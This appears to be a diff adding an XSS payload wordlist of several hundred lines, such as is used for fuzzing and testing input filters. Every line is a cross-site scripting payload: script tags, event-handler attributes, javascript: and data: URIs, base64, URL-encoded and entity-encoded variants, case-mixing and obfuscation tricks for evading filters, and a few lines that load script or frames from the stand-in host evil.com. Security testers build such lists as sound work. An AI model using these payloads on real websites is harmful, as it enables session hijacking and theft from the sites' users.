@@ -1,0 +1,582 @@
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(`XSS`)</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+<script>console.log('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert("XSS")>
+<img src=x onerror=alert(`XSS`)>
+<img src=x onerror=confirm('XSS')>
+<img src=x onerror=prompt('XSS')>
+<svg onload=alert('XSS')>
+<svg onload=alert("XSS")>
+<svg onload=alert(`XSS`)>
+<svg onload=confirm('XSS')>
+<svg onload=prompt('XSS')>
+<iframe src=javascript:alert('XSS')>
+<iframe src=javascript:alert("XSS")>
+<iframe src=javascript:alert(`XSS`)>
+<iframe src=javascript:confirm('XSS')>
+<iframe src=javascript:prompt('XSS')>
+<body onload=alert('XSS')>
+<body onload=alert("XSS")>
+<body onload=alert(`XSS`)>
+<input autofocus onfocus=alert('XSS')>
+<input autofocus onfocus=alert("XSS")>
+<input autofocus onfocus=alert(`XSS`)>
+<select autofocus onfocus=alert('XSS')>
+<select autofocus onfocus=alert("XSS")>
+<select autofocus onfocus=alert(`XSS`)>
+<textarea autofocus onfocus=alert('XSS')>
+<textarea autofocus onfocus=alert("XSS")>
+<textarea autofocus onfocus=alert(`XSS`)>
+<keygen autofocus onfocus=alert('XSS')>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+<meter value=2 min=0 max=10 onmouseover=alert('XSS')>
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<applet code="javascript:alert('XSS')">
+<form><button formaction=javascript:alert('XSS')>
+<form><input formaction=javascript:alert('XSS')>
+<form><input type=submit formaction=javascript:alert('XSS')>
+<math><mi//xlink:href="data:x,<script>alert('XSS')</script>">
+<div/onmouseover='alert("XSS")'>
+<div/onmouseover="alert('XSS')">
+<div style=x:expression(alert('XSS'))>
+<div style="x:expression(alert('XSS'))">
+<div style="background:url(javascript:alert('XSS'))">
+<style>@import'javascript:alert("XSS")';</style>
+<style>@import"javascript:alert('XSS')";</style>
+<style>body{background:url("javascript:alert('XSS')")}</style>
+<link rel=stylesheet href="javascript:alert('XSS')">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert('XSS')</script>">
+<base href="javascript:alert('XSS')//">
+<form><input type="image" src="javascript:alert('XSS')">
+<form><input type="submit" formaction="javascript:alert('XSS')">
+<button onclick="alert('XSS')">click</button>
+<button onclick="alert(&quot;XSS&quot;)">click</button>
+<button onclick=alert('XSS')>click</button>
+<a href="javascript:alert('XSS')">click</a>
+<a href="javascript:alert(&quot;XSS&quot;)">click</a>
+<a href="javascript:confirm('XSS')">click</a>
+<a href="javascript:prompt('XSS')">click</a>
+<a href="data:text/html,<script>alert('XSS')</script>">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">click</a>
+<form action="javascript:alert('XSS')">
+<form action="javascript:alert(&quot;XSS&quot;)">
+<frameset onload=alert('XSS')>
+<table background="javascript:alert('XSS')">
+<table><td background="javascript:alert('XSS')">
+<div id="x"></div><script>x.innerHTML='<img src=1 onerror=alert("XSS")>'</script>
+<div id="x"></div><script>document.getElementById('x').innerHTML='<img src=1 onerror=alert("XSS")>'</script>
+<script>document.write('<img src=1 onerror=alert("XSS")>')</script>
+<script>document.writeln('<img src=1 onerror=alert("XSS")>')</script>
+<script>eval('alert("XSS")')</script>
+<script>setTimeout('alert("XSS")',1)</script>
+<script>setInterval('alert("XSS")',1)</script>
+<script>Function('alert("XSS")')();</script>
+<script>top.alert('XSS')</script>
+<script>parent.alert('XSS')</script>
+<script>self.alert('XSS')</script>
+<script>window.alert('XSS')</script>
+<script>frames.alert('XSS')</script>
+<script>content.alert('XSS')</script>
+<script>[].constructor.constructor('alert("XSS")')();</script>
+<script>Array.constructor.constructor('alert("XSS")')();</script>
+<script>Object.constructor.constructor('alert("XSS")')();</script>
+<script>String.constructor.constructor('alert("XSS")')();</script>
+<script>Number.constructor.constructor('alert("XSS")')();</script>
+<script>Boolean.constructor.constructor('alert("XSS")')();</script>
+<script>Function.constructor.constructor('alert("XSS")')();</script>
+<script>Date.constructor.constructor('alert("XSS")')();</script>
+<script>RegExp.constructor.constructor('alert("XSS")')();</script>
+<script>Error.constructor.constructor('alert("XSS")')();</script>
+<script>with(document)write('<img src=1 onerror=alert("XSS")>')</script>
+<script>throw onerror=alert,'XSS',0,0,0</script>
+<script>throw onerror=eval,'=alert\x281\x29',0,0,0</script>
+<script>`${alert('XSS')}`</script>
+<script>alert`XSS`</script>
+<script>eval`alert\x28'XSS'\x29`</script>
+<script>setTimeout`alert\x28'XSS'\x29`</script>
+<script>setInterval`alert\x28'XSS'\x29`</script>
+<script>Function`x${alert('XSS')}x`</script>
+<script>new Function`x${alert('XSS')}x`</script>
+<script>new Function`x${alert\`XSS\`}x`</script>
+<script>(alert)('XSS')</script>
+<script>(alert).call(this,'XSS')</script>
+<script>(alert).apply(this,['XSS'])</script>
+<script>alert.call(null,'XSS')</script>
+<script>alert.apply(null,['XSS'])</script>
+<script>[alert][0]('XSS')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/.source)</script>
+<script>alert(/XSS/)</script>
+<script>alert(unescape('%58%53%53'))</script>
+<script>alert(decodeURI('%58%53%53'))</script>
+<script>alert(decodeURIComponent('%58%53%53'))</script>
+<script>alert(atob('WFNT'))</script>
+<script>alert(String.fromCodePoint(88,83,83))</script>
+<script>for(i in self)if(/^al/.test(i))self[i]('XSS')</script>
+<script>top["al"+"ert"]('XSS')</script>
+<script>top[/al/.source+/ert/.source]('XSS')</script>
+<script>al\u0065rt('XSS')</script>
+<script>al\x65rt('XSS')</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')</script>
+<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029')</script>
+<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>
+<script>eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0058\\u0053\\u0053\\u0027\\u0029')</script>
+<script>+alert+('XSS')</script>
+<script>-alert-('XSS')</script>
+<script>!alert!('XSS')</script>
+<script>~alert~('XSS')</script>
+<script>++alert++('XSS')</script>
+<script>--alert--('XSS')</script>
+<script>alert('XSS')//</script>
+<script>alert('XSS')/**/</script>
+<script>alert('XSS')/*comment*/</script>
+<script>alert(/*comment*/'XSS')</script>
+<script>/*comment*/alert('XSS')</script>
+<script>alert('XS'+'S')</script>
+<script>alert('XS'.concat('S'))</script>
+<script>alert(`XS${'S'}`)</script>
+<script>a=alert;a('XSS')</script>
+<script>var a=alert;a('XSS')</script>
+<script>let a=alert;a('XSS')</script>
+<script>const a=alert;a('XSS')</script>
+<script>{alert('XSS')}</script>
+<script>(function(){alert('XSS')})()</script>
+<script>!function(){alert('XSS')}()</script>
+<script>+function(){alert('XSS')}()</script>
+<script>-function(){alert('XSS')}()</script>
+<script>~function(){alert('XSS')}()</script>
+<script>(()=>alert('XSS'))()</script>
+<script>(_=>alert('XSS'))()</script>
+<script>(async()=>alert('XSS'))()</script>
+<script>new Function('alert("XSS")')();</script>
+<script>new Function('a\x6cert("XSS")')();</script>
+<script>new Function('a\u006cert("XSS")')();</script>
+<script>setTimeout(function(){alert('XSS')},1)</script>
+<script>setInterval(function(){alert('XSS')},1)</script>
+<script>requestAnimationFrame(function(){alert('XSS')})</script>
+<script>setImmediate(function(){alert('XSS')})</script>
+<script>process.nextTick(function(){alert('XSS')})</script>
+<script>Promise.resolve().then(function(){alert('XSS')})</script>
+<script>queueMicrotask(function(){alert('XSS')})</script>
+javascript:alert('XSS')
+javascript:alert("XSS")
+javascript:alert(`XSS`)
+javascript:confirm('XSS')
+javascript:prompt('XSS')
+javascript:console.log('XSS')
+javascript:eval('alert("XSS")')
+javascript:setTimeout('alert("XSS")',1)
+javascript:setInterval('alert("XSS")',1)
+javascript:Function('alert("XSS")')()
+javascript:[].constructor.constructor('alert("XSS")')()
+javascript:with(document)write('<img src=1 onerror=alert("XSS")>')
+javascript:throw onerror=alert,'XSS',0,0,0
+javascript:`${alert('XSS')}`
+javascript:alert`XSS`
+javascript:eval`alert\x28'XSS'\x29`
+javascript:(alert)('XSS')
+javascript:(alert).call(this,'XSS')
+javascript:(alert).apply(this,['XSS'])
+javascript:alert.call(null,'XSS')
+javascript:alert.apply(null,['XSS'])
+javascript:[alert][0]('XSS')
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:alert(/XSS/.source)
+javascript:alert(/XSS/)
+javascript:alert(unescape('%58%53%53'))
+javascript:alert(decodeURI('%58%53%53'))
+javascript:alert(decodeURIComponent('%58%53%53'))
+javascript:alert(atob('WFNT'))
+javascript:alert(String.fromCodePoint(88,83,83))
+javascript:for(i in self)if(/^al/.test(i))self[i]('XSS')
+javascript:top["al"+"ert"]('XSS')
+javascript:top[/al/.source+/ert/.source]('XSS')
+javascript:al\u0065rt('XSS')
+javascript:al\x65rt('XSS')
+javascript:eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')
+javascript:eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029')
+javascript:+alert+('XSS')
+javascript:-alert-('XSS')
+javascript:!alert!('XSS')
+javascript:~alert~('XSS')
+javascript:++alert++('XSS')
+javascript:--alert--('XSS')
+javascript:alert('XS'+'S')
+javascript:alert('XS'.concat('S'))
+javascript:alert(`XS${'S'}`)
+javascript:a=alert;a('XSS')
+javascript:var a=alert;a('XSS')
+javascript:let a=alert;a('XSS')
+javascript:const a=alert;a('XSS')
+javascript:{alert('XSS')}
+javascript:(function(){alert('XSS')})()
+javascript:!function(){alert('XSS')}()
+javascript:+function(){alert('XSS')}()
+javascript:-function(){alert('XSS')}()
+javascript:~function(){alert('XSS')}()
+javascript:(()=>alert('XSS'))()
+javascript:(_=>alert('XSS'))()
+javascript:(async()=>alert('XSS'))()
+javascript:new Function('alert("XSS")')();
+javascript:new Function('a\x6cert("XSS")')();
+javascript:new Function('a\u006cert("XSS")')();
+data:text/html,<script>alert('XSS')</script>
+data:text/html,<script>alert("XSS")</script>
+data:text/html,<script>alert(`XSS`)</script>
+data:text/html,<script>confirm('XSS')</script>
+data:text/html,<script>prompt('XSS')</script>
+data:text/html,<img src=x onerror=alert('XSS')>
+data:text/html,<svg onload=alert('XSS')>
+data:text/html,<iframe src=javascript:alert('XSS')>
+data:text/html,<body onload=alert('XSS')>
+data:text/html,<input autofocus onfocus=alert('XSS')>
+data:text/html;charset=utf-8,<script>alert('XSS')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydChgWFNTYCk8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5jb25maXJtKCdYU1MnKTwvc2NyaXB0Pg==
+data:text/html;base64,PHNjcmlwdD5wcm9tcHQoJ1hTUycpPC9zY3JpcHQ+
+data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4=
+data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPg==
+data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgnWFNTJyk+
+data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KCdYU1MnKT4=
+data:text/html;base64,PGlucHV0IGF1dG9mb2N1cyBvbmZvY3VzPWFsZXJ0KCdYU1MnKT4=
+data:text/javascript,alert('XSS')
+data:text/javascript,alert("XSS")
+data:text/javascript,alert(`XSS`)
+data:text/javascript,confirm('XSS')
+data:text/javascript,prompt('XSS')
+data:text/javascript;charset=utf-8,alert('XSS')
+data:text/javascript;base64,YWxlcnQoJ1hTUycp
+data:text/javascript;base64,YWxlcnQoIlhTUyIp
+data:text/javascript;base64,YWxlcnQoYFhTU2Ap
+data:text/javascript;base64,Y29uZmlybSgnWFNTJyk=
+data:text/javascript;base64,cHJvbXB0KCdYU1MnKQ==
+data:application/javascript,alert('XSS')
+data:application/javascript,alert("XSS")
+data:application/javascript,alert(`XSS`)
+data:application/javascript,confirm('XSS')
+data:application/javascript,prompt('XSS')
+data:application/javascript;charset=utf-8,alert('XSS')
+data:application/javascript;base64,YWxlcnQoJ1hTUycp
+data:application/javascript;base64,YWxlcnQoIlhTUyIp
+data:application/javascript;base64,YWxlcnQoYFhTU2Ap
+data:application/javascript;base64,Y29uZmlybSgnWFNTJyk=
+data:application/javascript;base64,cHJvbXB0KCdYU1MnKQ==
+'><script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+`><script>alert('XSS')</script>
+'><script>alert("XSS")</script>
+"><script>alert("XSS")</script>
+`><script>alert("XSS")</script>
+'><script>alert(`XSS`)</script>
+"><script>alert(`XSS`)</script>
+`><script>alert(`XSS`)</script>
+'><img src=x onerror=alert('XSS')>
+"><img src=x onerror=alert('XSS')>
+`><img src=x onerror=alert('XSS')>
+'><svg onload=alert('XSS')>
+"><svg onload=alert('XSS')>
+`><svg onload=alert('XSS')>
+'><iframe src=javascript:alert('XSS')>
+"><iframe src=javascript:alert('XSS')>
+`><iframe src=javascript:alert('XSS')>
+'><body onload=alert('XSS')>
+"><body onload=alert('XSS')>
+`><body onload=alert('XSS')>
+'><input autofocus onfocus=alert('XSS')>
+"><input autofocus onfocus=alert('XSS')>
+`><input autofocus onfocus=alert('XSS')>
+' onmouseover='alert("XSS")
+" onmouseover="alert('XSS')
+` onmouseover=`alert('XSS')
+' onclick='alert("XSS")
+" onclick="alert('XSS')
+` onclick=`alert('XSS')
+' onfocus='alert("XSS")
+" onfocus="alert('XSS')
+` onfocus=`alert('XSS')
+' onload='alert("XSS")
+" onload="alert('XSS')
+` onload=`alert('XSS')
+' onerror='alert("XSS")
+" onerror="alert('XSS')
+` onerror=`alert('XSS')
+' autofocus onfocus='alert("XSS")
+" autofocus onfocus="alert('XSS')
+` autofocus onfocus=`alert('XSS')
+'autofocus onfocus='alert("XSS")
+"autofocus onfocus="alert('XSS')
+`autofocus onfocus=`alert('XSS')
+'/><script>alert('XSS')</script>
+"/><script>alert('XSS')</script>
+`/><script>alert('XSS')</script>
+'/><img src=x onerror=alert('XSS')>
+"/><img src=x onerror=alert('XSS')>
+`/><img src=x onerror=alert('XSS')>
+'/><svg onload=alert('XSS')>
+"/><svg onload=alert('XSS')>
+`/><svg onload=alert('XSS')>
+'/><iframe src=javascript:alert('XSS')>
+"/><iframe src=javascript:alert('XSS')>
+`/><iframe src=javascript:alert('XSS')>
+'/><body onload=alert('XSS')>
+"/><body onload=alert('XSS')>
+`/><body onload=alert('XSS')>
+'/><input autofocus onfocus=alert('XSS')>
+"/><input autofocus onfocus=alert('XSS')>
+`/><input autofocus onfocus=alert('XSS')>
+'></script><script>alert('XSS')</script>
+"></script><script>alert('XSS')</script>
+`></script><script>alert('XSS')</script>
+'></script><img src=x onerror=alert('XSS')>
+"></script><img src=x onerror=alert('XSS')>
+`></script><img src=x onerror=alert('XSS')>
+'></script><svg onload=alert('XSS')>
+"></script><svg onload=alert('XSS')>
+`></script><svg onload=alert('XSS')>
+'></script><iframe src=javascript:alert('XSS')>
+"></script><iframe src=javascript:alert('XSS')>
+`></script><iframe src=javascript:alert('XSS')>
+'></script><body onload=alert('XSS')>
+"></script><body onload=alert('XSS')>
+`></script><body onload=alert('XSS')>
+'></script><input autofocus onfocus=alert('XSS')>
+"></script><input autofocus onfocus=alert('XSS')>
+`></script><input autofocus onfocus=alert('XSS')>
+\"><script>alert('XSS')</script>
+\"><img src=x onerror=alert('XSS')>
+\"><svg onload=alert('XSS')>
+\"><iframe src=javascript:alert('XSS')>
+\"><body onload=alert('XSS')>
+\"><input autofocus onfocus=alert('XSS')>
+\'/><script>alert('XSS')</script>
+\'/><img src=x onerror=alert('XSS')>
+\'/><svg onload=alert('XSS')>
+\'/><iframe src=javascript:alert('XSS')>
+\'/><body onload=alert('XSS')>
+\'/><input autofocus onfocus=alert('XSS')>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+%3Cscript%3Ealert("XSS")%3C/script%3E
+%3Cscript%3Ealert(`XSS`)%3C/script%3E
+%3Cscript%3Econfirm('XSS')%3C/script%3E
+%3Cscript%3Eprompt('XSS')%3C/script%3E
+%3Cimg%20src=x%20onerror=alert('XSS')%3E
+%3Csvg%20onload=alert('XSS')%3E
+%3Ciframe%20src=javascript:alert('XSS')%3E
+%3Cbody%20onload=alert('XSS')%3E
+%3Cinput%20autofocus%20onfocus=alert('XSS')%3E
+%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E
+%27%3E%3Cscript%3Ealert('XSS')%3C/script%3E
+%60%3E%3Cscript%3Ealert('XSS')%3C/script%3E
+%22%3E%3Cimg%20src=x%20onerror=alert('XSS')%3E
+%27%3E%3Cimg%20src=x%20onerror=alert('XSS')%3E
+%60%3E%3Cimg%20src=x%20onerror=alert('XSS')%3E
+%22%3E%3Csvg%20onload=alert('XSS')%3E
+%27%3E%3Csvg%20onload=alert('XSS')%3E
+%60%3E%3Csvg%20onload=alert('XSS')%3E
+%22%3E%3Ciframe%20src=javascript:alert('XSS')%3E
+%27%3E%3Ciframe%20src=javascript:alert('XSS')%3E
+%60%3E%3Ciframe%20src=javascript:alert('XSS')%3E
+%22%3E%3Cbody%20onload=alert('XSS')%3E
+%27%3E%3Cbody%20onload=alert('XSS')%3E
+%60%3E%3Cbody%20onload=alert('XSS')%3E
+%22%3E%3Cinput%20autofocus%20onfocus=alert('XSS')%3E
+%27%3E%3Cinput%20autofocus%20onfocus=alert('XSS')%3E
+%60%3E%3Cinput%20autofocus%20onfocus=alert('XSS')%3E
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert("XSS")&lt;/script&gt;
+&lt;script&gt;alert(`XSS`)&lt;/script&gt;
+&lt;script&gt;confirm('XSS')&lt;/script&gt;
+&lt;script&gt;prompt('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;iframe src=javascript:alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+&lt;input autofocus onfocus=alert('XSS')&gt;
+&quot;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
+&#x27;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
+&#x60;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;
+&quot;&gt;&lt;img src=x onerror=alert('XSS')&gt;
+&#x27;&gt;&lt;img src=x onerror=alert('XSS')&gt;
+&#x60;&gt;&lt;img src=x onerror=alert('XSS')&gt;
+&quot;&gt;&lt;svg onload=alert('XSS')&gt;
+&#x27;&gt;&lt;svg onload=alert('XSS')&gt;
+&#x60;&gt;&lt;svg onload=alert('XSS')&gt;
+&quot;&gt;&lt;iframe src=javascript:alert('XSS')&gt;
+&#x27;&gt;&lt;iframe src=javascript:alert('XSS')&gt;
+&#x60;&gt;&lt;iframe src=javascript:alert('XSS')&gt;
+&quot;&gt;&lt;body onload=alert('XSS')&gt;
+&#x27;&gt;&lt;body onload=alert('XSS')&gt;
+&#x60;&gt;&lt;body onload=alert('XSS')&gt;
+&quot;&gt;&lt;input autofocus onfocus=alert('XSS')&gt;
+&#x27;&gt;&lt;input autofocus onfocus=alert('XSS')&gt;
+&#x60;&gt;&lt;input autofocus onfocus=alert('XSS')&gt;
+<SCRIPT>alert('XSS')</SCRIPT>
+<SCRIPT>alert("XSS")</SCRIPT>
+<SCRIPT>alert(`XSS`)</SCRIPT>
+<SCRIPT>confirm('XSS')</SCRIPT>
+<SCRIPT>prompt('XSS')</SCRIPT>
+<IMG SRC=x ONERROR=alert('XSS')>
+<SVG ONLOAD=alert('XSS')>
+<IFRAME SRC=javascript:alert('XSS')>
+<BODY ONLOAD=alert('XSS')>
+<INPUT AUTOFOCUS ONFOCUS=alert('XSS')>
+<ScRiPt>alert('XSS')</ScRiPt>
+<ScRiPt>alert("XSS")</ScRiPt>
+<ScRiPt>alert(`XSS`)</ScRiPt>
+<ScRiPt>confirm('XSS')</ScRiPt>
+<ScRiPt>prompt('XSS')</ScRiPt>
+<ImG SrC=x OnErRoR=alert('XSS')>
+<SvG OnLoAd=alert('XSS')>
+<IfrAmE SrC=javascript:alert('XSS')>
+<BoDy OnLoAd=alert('XSS')>
+<InPuT AuToFoCuS OnFoCuS=alert('XSS')>
+<script/src=//evil.com/xss.js></script>
+<script/src=data:,alert('XSS')></script>
+<script/src=//google.com/complete/search?client=chrome></script>
+<iframe/src=//evil.com/xss.html></iframe>
+<iframe/src=data:text/html,<script>alert('XSS')</script>></iframe>
+<object/data=//evil.com/xss.swf></object>
+<object/data=data:text/html,<script>alert('XSS')</script>></object>
+<embed/src=//evil.com/xss.swf></embed>
+<embed/src=data:text/html,<script>alert('XSS')</script>></embed>
+<form/action=javascript:alert('XSS')></form>
+<button/formaction=javascript:alert('XSS')></button>
+<input/formaction=javascript:alert('XSS')></input>
+<isindex/action=javascript:alert('XSS')></isindex>
+<base/href=javascript:alert('XSS')//>
+<link/rel=stylesheet/href=data:,body{background:url('javascript:alert("XSS")')}>
+<style>@import'data:,body{background:url("javascript:alert(\"XSS\")")}';</style>
+<meta/http-equiv=refresh/content=0;url=javascript:alert('XSS')>
+<title/onpropertychange=alert('XSS')></title>
+<div/style=x:expression(alert('XSS'))>
+<div/style=width:expression(alert('XSS'))>
+<div/style=height:expression(alert('XSS'))>
+<div/style=color:expression(alert('XSS'))>
+<div/style=background:expression(alert('XSS'))>
+<div/style=background-color:expression(alert('XSS'))>
+<div/style=background-image:expression(alert('XSS'))>
+<div/style=background-position:expression(alert('XSS'))>
+<div/style=background-repeat:expression(alert('XSS'))>
+<div/style=background-attachment:expression(alert('XSS'))>
+<div/style=background-origin:expression(alert('XSS'))>
+<div/style=background-clip:expression(alert('XSS'))>
+<div/style=background-size:expression(alert('XSS'))>
+<div/style=border:expression(alert('XSS'))>
+<div/style=border-width:expression(alert('XSS'))>
+<div/style=border-style:expression(alert('XSS'))>
+<div/style=border-color:expression(alert('XSS'))>
+<div/style=border-top:expression(alert('XSS'))>
+<div/style=border-top-width:expression(alert('XSS'))>
+<div/style=border-top-style:expression(alert('XSS'))>
+<div/style=border-top-color:expression(alert('XSS'))>
+<div/style=border-right:expression(alert('XSS'))>
+<div/style=border-right-width:expression(alert('XSS'))>
+<div/style=border-right-style:expression(alert('XSS'))>
+<div/style=border-right-color:expression(alert('XSS'))>
+<div/style=border-bottom:expression(alert('XSS'))>
+<div/style=border-bottom-width:expression(alert('XSS'))>
+<div/style=border-bottom-style:expression(alert('XSS'))>
+<div/style=border-bottom-color:expression(alert('XSS'))>
+<div/style=border-left:expression(alert('XSS'))>
+<div/style=border-left-width:expression(alert('XSS'))>
+<div/style=border-left-style:expression(alert('XSS'))>
+<div/style=border-left-color:expression(alert('XSS'))>
+<div/style=border-radius:expression(alert('XSS'))>
+<div/style=border-top-left-radius:expression(alert('XSS'))>
+<div/style=border-top-right-radius:expression(alert('XSS'))>
+<div/style=border-bottom-right-radius:expression(alert('XSS'))>
+<div/style=border-bottom-left-radius:expression(alert('XSS'))>
+<div/style=margin:expression(alert('XSS'))>
+<div/style=margin-top:expression(alert('XSS'))>
+<div/style=margin-right:expression(alert('XSS'))>
+<div/style=margin-bottom:expression(alert('XSS'))>
+<div/style=margin-left:expression(alert('XSS'))>
+<div/style=padding:expression(alert('XSS'))>
+<div/style=padding-top:expression(alert('XSS'))>
+<div/style=padding-right:expression(alert('XSS'))>
+<div/style=padding-bottom:expression(alert('XSS'))>
+<div/style=padding-left:expression(alert('XSS'))>
+<div/style=list-style:expression(alert('XSS'))>
+<div/style=list-style-type:expression(alert('XSS'))>
+<div/style=list-style-position:expression(alert('XSS'))>
+<div/style=list-style-image:expression(alert('XSS'))>
+alert('XSS')
+alert("XSS")
+alert(`XSS`)
+confirm('XSS')
+prompt('XSS')
+console.log('XSS')
+eval('alert("XSS")')
+setTimeout('alert("XSS")',1)
+setInterval('alert("XSS")',1)
+Function('alert("XSS")')()
+[].constructor.constructor('alert("XSS")')()
+with(document)write('<img src=1 onerror=alert("XSS")>')
+throw onerror=alert,'XSS',0,0,0
+`${alert('XSS')}`
+alert`XSS`
+eval`alert\x28'XSS'\x29`
+(alert)('XSS')
+(alert).call(this,'XSS')
+(alert).apply(this,['XSS'])
+alert.call(null,'XSS')
+alert.apply(null,['XSS'])
+[alert][0]('XSS')
+alert(String.fromCharCode(88,83,83))
+alert(/XSS/.source)
+alert(/XSS/)
+alert(unescape('%58%53%53'))
+alert(decodeURI('%58%53%53'))
+alert(decodeURIComponent('%58%53%53'))
+alert(atob('WFNT'))
+alert(String.fromCodePoint(88,83,83))
+for(i in self)if(/^al/.test(i))self[i]('XSS')
+top["al"+"ert"]('XSS')
+top[/al/.source+/ert/.source]('XSS')
+al\u0065rt('XSS')
+al\x65rt('XSS')
+eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')
+eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029')
++alert+('XSS')
+-alert-('XSS')
+!alert!('XSS')
+~alert~('XSS')
+++alert++('XSS')
+--alert--('XSS')
+alert('XS'+'S')
+alert('XS'.concat('S'))
+alert(`XS${'S'}`)
+a=alert;a('XSS')
+var a=alert;a('XSS')
+let a=alert;a('XSS')
+const a=alert;a('XSS')
+{alert('XSS')}
+(function(){alert('XSS')})()
+!function(){alert('XSS')}()
++function(){alert('XSS')}()
+-function(){alert('XSS')}()
+~function(){alert('XSS')}()
+(()=>alert('XSS'))()
+(_=>alert('XSS'))()
+(async()=>alert('XSS'))()
+new Function('alert("XSS")')();
+new Function('a\x6cert("XSS")')();
+new Function('a\u006cert("XSS")')();
+setTimeout(function(){alert('XSS')},1)
+setInterval(function(){alert('XSS')},1)
+requestAnimationFrame(function(){alert('XSS')})
+setImmediate(function(){alert('XSS')})
+process.nextTick(function(){alert('XSS')})
+Promise.resolve().then(function(){alert('XSS')})
+queueMicrotask(function(){alert('XSS')})
